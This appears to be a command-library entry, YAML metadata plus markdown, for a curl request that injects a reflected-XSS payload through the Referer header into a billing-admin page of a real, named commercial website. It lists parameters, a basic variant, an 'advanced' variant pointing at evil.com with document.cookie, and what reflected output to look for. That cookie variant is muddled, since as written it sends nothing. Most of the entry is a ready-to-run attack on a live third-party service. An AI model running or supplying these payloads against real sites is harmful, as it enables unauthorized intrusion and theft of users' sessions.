---
id: cmd-uuid-5678
data: >-
  curl -X GET "https://www.semrush.com/billing-admin/profile/subscription/?l=de"
  -H "Host: www.semrush.com" -H "Accept: */*" -H "Accept-Language: en" -H
  "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
  Trident/5.0)" -H "Connection: close" -H "Referer:
  http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5"
tags:
  - xss
  - web
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.352Z'
verified: false
validated: true
submitted: true
---
# curl-reflected-xss-referer-injection

## Command

```bash
curl -X GET "https://www.semrush.com/billing-admin/profile/subscription/?l=de" \
  -H "Host: www.semrush.com" \
  -H "Accept: */*" \
  -H "Accept-Language: en" \
  -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" \
  -H "Connection: close" \
  -H "Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5"
```

## Description

This curl command sends a GET request to the Semrush billing admin endpoint with a malicious XSS payload injected into the Referer header, exploiting a reflection vulnerability to demonstrate JavaScript execution. Use it to test or reproduce the vulnerability in a controlled environment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL path | Target endpoint `/billing-admin/profile/subscription/?l=de` | Yes |
| `-H "Host: ..."` | Sets the Host header to the target domain | Yes |
| `-H "Accept: */*"` | Accepts any content type | Yes |
| `-H "Accept-Language: en"` | Sets language preference | No |
| `-H "User-Agent: ..."` | Mimics an IE9 browser for compatibility testing | No |
| `-H "Connection: close"` | Closes connection after request | No |
| `-H "Referer: ..."` | Injects the malicious payload URL with XSS | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.semrush.com/billing-admin/profile/subscription/?l=de" -H "Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5"
```

### Advanced Usage

```bash
curl -X GET "https://www.semrush.com/billing-admin/profile/subscription/?l=de" \
  -H "Host: www.semrush.com" \
  -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" \
  -H "Referer: http://evil.com/payload?c5obc'+document.cookie+'p7yd5" \
  -v
```

Add `-v` for verbose output to inspect headers and response.

## Expected Output

The command outputs the HTTP response, which should include the echoed Referer payload in the body (e.g., in HTML attributes or scripts). Look for the string `c5obc'+alert(1)+'p7yd5` unsanitized. In a browser context, this would trigger the alert; here, verify reflection manually.

## Related

- [[procedures/Exploit-Reflected-XSS-via-Referer-Header-Injection]]
